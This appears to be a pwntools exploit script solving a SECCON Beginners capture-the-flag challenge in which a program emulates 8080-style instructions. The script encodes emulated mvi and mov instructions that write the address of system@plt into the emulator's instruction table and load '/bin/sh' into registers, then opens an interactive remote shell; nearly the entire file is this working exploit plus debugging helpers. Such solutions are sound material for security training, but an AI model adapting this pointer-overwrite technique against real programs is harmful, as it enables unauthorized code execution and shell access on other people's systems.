from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'emulator.quals.beginners.seccon.jp'
PORT = 4100

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def a():
	r.sendlineafter('A', 'A')

r = start()
if args.D:
	debug(r, [0x14bd])

# mvi A d8: 3e
# mvi B d8: 06
# mvi C d8: 0e
# mvi D d8: 16
# mvi E d8: 1e
# mvi H d8: 26
# mvi L d8: 2e
# mvi M d8: 36

def mvia(v):
	return '\x3e'+chr(v)
def mvib(v):
	return '\x06'+chr(v)
def mvic(v):
	return '\x0e'+chr(v)
def mvid(v):
	return '\x16'+chr(v)
def mvie(v):
	return '\x1e'+chr(v)
def mvih(v):
	return '\x26'+chr(v)
def mvil(v):
	return '\x2e'+chr(v)

def movma():
	return '\x77'

def hlt():
	return '\x76'
def ret():
	return '\xc9'

def set_binsh():
	payload = ''
	payload += mvia(ord('/'))
	payload += mvib(ord('b'))
	payload += mvic(ord('i'))
	payload += mvid(ord('n'))
	payload += mvie(ord('/'))
	payload += mvih(ord('s'))
	payload += mvil(ord('h'))
	return payload

payload = ''
# ins0 -> system
for i in range(3):
	payload += mvia((elf.plt.system >> (i*8)) % 0x100)
	payload += mvih(0x40)
	payload += mvil(0x4+i)
	payload += movma()
payload += set_binsh() 
payload += '\x00'


payload += hlt()
payload += ret()

r.sendafter('...\n', payload)

r.interactive()
r.close()
